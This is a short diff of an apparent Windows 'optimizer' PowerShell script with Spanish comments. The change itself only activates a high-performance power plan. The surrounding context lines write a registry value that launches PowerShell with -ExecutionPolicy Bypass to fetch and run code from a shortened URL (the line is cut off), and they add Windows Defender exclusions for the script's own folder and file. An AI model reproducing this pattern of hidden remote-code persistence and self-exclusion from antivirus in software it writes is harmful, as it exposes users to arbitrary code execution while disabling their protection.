@@ -22,7 +22,10 @@ $valueData = 'powershell.exe -ExecutionPolicy Bypass -Command "irm https://cutt.
 # Agregar la entrada al registro
 Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData
 
-
+$maxPerformanceScheme = powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61
+$guid = [regex]::Match($maxPerformanceScheme, '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}').Value
+powercfg -setactive $guid
+  
 # Agregar excepciones
 Add-MpPreference -ExclusionPath "C:\Windows\Setup\FilesU"
 Add-MpPreference -ExclusionProcess "C:\Windows\Setup\FilesU\Optimizador-Windows.ps1"
